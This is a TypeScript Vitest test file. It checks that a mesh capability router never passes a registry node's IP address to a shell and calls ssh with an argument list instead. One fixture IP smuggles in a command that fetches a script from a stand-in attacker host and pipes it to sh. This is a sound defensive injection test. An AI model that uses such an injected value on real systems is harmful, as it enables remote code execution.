import { beforeEach, describe, expect, it, vi } from 'vitest'

const child = vi.hoisted(() => ({
    execSync: vi.fn((): Buffer => { throw new Error('not available') }),
    execFileSync: vi.fn((): Buffer => Buffer.from('')),
}))
const mesh = vi.hoisted(() => ({ nodes: [] as any[] }))

vi.mock('node:child_process', () => ({ execSync: child.execSync, execFileSync: child.execFileSync }))
vi.mock('../mesh/mesh-registry.js', () => ({ discoverNodes: async () => mesh.nodes }))

import { CAPABILITIES, resolveCapability } from './capability-router.js'

function allCommandText(): string {
    const calls = [...child.execSync.mock.calls, ...child.execFileSync.mock.calls] as unknown[][]
    return calls.map(call => JSON.stringify(call)).join('\n')
}

beforeEach(() => {
    child.execSync.mockClear()
    child.execFileSync.mockClear()
})

describe('R2 L6: mesh node ip never reaches a shell', () => {
    it('ignores a registry node whose ip carries shell syntax', async () => {
        mesh.nodes = [{ node_id: 'evil', hostname: 'evil', status: 'online', platform: 'linux', hardware: { ram_gb: 16 }, ip: '1.2.3.4;curl evil.example|sh;#' }]

        const resolution = await resolveCapability(CAPABILITIES.whisper())

        expect(allCommandText()).not.toContain('curl evil')
        expect(resolution.runRemotely).toBe(false)
    })

    it('calls ssh with an argument list for a valid ip', async () => {
        mesh.nodes = [{ node_id: 'spark', hostname: 'spark', status: 'online', platform: 'linux', hardware: { ram_gb: 16 }, ip: '100.64.0.10' }]
        child.execFileSync.mockImplementation(() => Buffer.from('ok'))

        const resolution = await resolveCapability(CAPABILITIES.whisper())

        expect(resolution.runRemotely).toBe(true)
        const sshCall = child.execFileSync.mock.calls.find(call => (call as unknown[])[0] === 'ssh') as unknown[] | undefined
        expect(sshCall).toBeDefined()
        expect(sshCall![1]).toContain('xaventra@100.64.0.10')
        expect(child.execSync.mock.calls.some(call => String((call as unknown[])[0]).includes('ssh'))).toBe(false)
    })
})
